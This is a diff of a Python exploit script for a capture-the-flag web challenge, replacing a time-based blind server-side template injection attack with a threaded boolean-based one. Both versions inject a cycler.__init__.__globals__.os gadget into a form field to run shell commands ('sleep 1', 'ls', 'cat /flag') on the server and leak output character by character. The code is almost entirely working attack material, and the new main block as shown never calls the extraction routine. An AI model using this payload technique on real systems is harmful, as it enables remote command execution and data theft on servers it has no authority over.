@@ -1,55 +1,51 @@
-import time
 import requests
 import string
-import argparse
+import re
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-class BlindSSTI:
-    def __init__(self, url, maxlen=200, timeout=3.0):
-        self.url = url
-        self.maxlen = maxlen
-        self.timeout = timeout
-        self.gadget = "cycler.__init__.__globals__.os"
-        self.charset = string.ascii_letters + string.digits + "{}_-:/()[]=!@#$%^&*+., \n"
+class Exploit:
+    def __init__(self, baseURL, max_workers=5):
+        self.baseURL = baseURL.rstrip("/")
+        self.charset = string.ascii_letters + string.digits + "}*!@#$%^&()-+_"
+        self.prefix = "pokactf2024{"
+        self.timeout = 10
+        self.max_workers = max_workers
 
-    def send(self, data):
-        t0 = time.time()
+    def send_request(self, payload):
         try:
-            requests.post(self.url, data=data, timeout=self.timeout)
-        except requests.RequestException:
-            return self.timeout
-        return time.time() - t0
-    def calibrate(self):
-        fast = self.send({"a": "0", "b": "0"})
-        slow = self.send({"a": f"({self.gadget}.system('sleep 1'))", "b": "0"})
-        self.threshold = (fast + slow) / 2
-        print(f"[*] Calibrated: fast≈{fast:.3f}s  slow≈{slow:.3f}s  -> threshold={self.threshold:.3f}s")
+            r = requests.post(f"{self.baseURL}/cal", data={"a": payload, "b": "0"}, timeout=self.timeout)
+        except requests.RequestException as e:
+            return False
+        text = r.text
+        if "Only 0, 1" in text:
+            return False
+        return bool(re.search(r"(?:<p>\s*1\s*</p>|result\">1|>1<|1</|\n1\n)", text))
 
-    def build_payload(self, ch, idx):
-        a = f"({self.gadget}.system('sleep 1') if ord({self.gadget}.popen('ls').read()[{idx}])=={ord(ch)} else 0)"
-        return {"a": a, "b": "0"}
+    def build_payload(self, current_flag, char):
+        q = repr(current_flag + char)
+        payload = f"(cycler.__init__.__globals__.os.popen('cat /flag').read().strip().startswith({q}) and 1 or 0)"
+        return char if self.send_request(payload) else None
 
-    def extract_output(self):
-        out = ""
-        for i in range(self.maxlen):
+    def extract_flag(self):
+        flag = self.prefix
+        while True:
             found = False
-            for ch in self.charset:
-                dt = self.send(self.build_payload(ch, i))
-                if dt >= self.threshold:
-                    out += ch
-                    print(f"[+] so far: {out!r}")
-                    found = True
-                    break
+            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+                futures = {executor.submit(self.build_payload, flag, c): c for c in self.charset}
+                for future in as_completed(futures):
+                    result = future.result()
+                    if result:
+                        flag += result
+                        print(f"[+] Found Char Flag -> Join Flag: {flag}")
+                        found = True
+                        if result == "}":
+                            print(f"[+] DONE FLAG: {flag}")
+                            return flag
+                        break
             if not found:
-                print(f"[*] Done. Full output: {out!r}")
-                break
-        return out
+                print("[-] No matching char found. Stopping.")
+                return flag
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--url", required=True, help="Target URL (e.g. http://host8.dreamhack.games:14476/cal)")
-    args = parser.parse_args()
-    exp = BlindSSTI(args.url)
-    print(f"[+] Gadget OK: {exp.gadget}")
-    exp.calibrate()
-    result = exp.extract_output()
-    print("\n[+] Final output:\n", result)
+    BASE_URL = "http://host8.dreamhack.games:11732"
+    exploit = Exploit(BASE_URL, max_workers=10) 
